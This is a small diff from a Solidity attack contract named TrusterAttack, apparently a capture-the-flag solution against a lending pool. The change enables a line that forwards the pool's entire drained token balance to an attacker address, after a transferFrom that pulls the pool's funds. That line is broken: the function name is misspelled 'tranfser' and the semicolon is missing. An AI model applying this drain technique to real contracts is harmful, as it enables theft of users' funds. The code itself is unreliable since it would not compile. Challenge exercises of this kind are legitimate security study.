@@ -50,7 +50,7 @@ contract TrusterAttack {
         //calldata = approve(pool, this)
         //response 
         token.transferFrom(poolAddress,address(this) , balance);
-        // token.tranfser(amount,attacker)
+        token.tranfser(balance,attacker)
         //
     }
     // function transferMe() public{
